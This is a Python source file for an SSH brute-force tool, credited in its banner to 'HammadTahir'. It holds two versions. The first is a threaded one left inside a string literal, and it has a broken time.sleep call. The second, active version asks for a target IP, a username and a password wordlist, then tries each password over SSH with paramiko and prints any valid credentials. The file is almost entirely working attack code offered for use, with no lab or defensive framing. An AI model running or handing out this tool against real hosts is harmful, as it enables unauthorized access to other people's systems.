"""
import sys
from time import time
import paramiko
import threading
import pyfiglet
def print_banner():
    banner = pyfiglet.figlet_format("SSH Brute Force \n by HammadTahir")
    print(banner)
    print("A simple tool to brute force SSH credentials.\n")   

def list_chnker(targetlist, chunk_size=100):
    for i in range(0, len(targetlist), chunk_size):
        yield targetlist[i:i+ chunk_size]

def ssh_brute_force(target, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(target, username=username, password=password, timeout=5)
            print(f"[+] Found valid credentials: {username}:{password}")
            client.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Failed login with {username}:{password}")
        except Exception as e:
            print(f"Error connecting to {target}: {e}")

def main():
    print_banner()

    target = str(input("Enter the target IP address: "))
    username = str(input("Enter the SSH username: "))
    target_passwords = input("Enter the path to the password list file: ").strip()

    pass_list =open(target_passwords, 'r').readlines()
    pass_list = [x.strip() for x in pass_list if x.strip()]

    threads = []

    for chunk in list_chnker(pass_list, chunk_size=100):
        if threading.active_count() > 5:
            time.sleep(0.2)
        t = threading.Thread(target=ssh_brute_force, args=(target, username, chunk))
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()

"""



import sys
import paramiko
import pyfiglet

def print_banner():
    banner = pyfiglet.figlet_format("SSH Brute Force\nby HammadTahir")
    print(banner)
    print("A simple tool to brute force SSH credentials.\n")

def ssh_brute_force(target, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"[*] Trying {username}:{password}")
            client.connect(target, username=username, password=password, timeout=5)
            print(f"[+] Found valid credentials: {username}:{password}")
            client.close()
            return True  # Stop after success
        except paramiko.AuthenticationException:
            print(f"[-] Failed login with {username}:{password}")
        except Exception as e:
            print(f"[!] Error connecting to {target}: {e}")
        finally:
            client.close()

    print("[!] No valid credentials found.")
    return False

def main():
    print_banner()

    target = input("Enter the target IP address: ").strip()
    username = input("Enter the SSH username: ").strip()
    wordlist_path = input("Enter the path to the password list file: ").strip()

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Could not find file: {wordlist_path}")
        return

    ssh_brute_force(target, username, passwords)

if __name__ == "__main__":
    main()
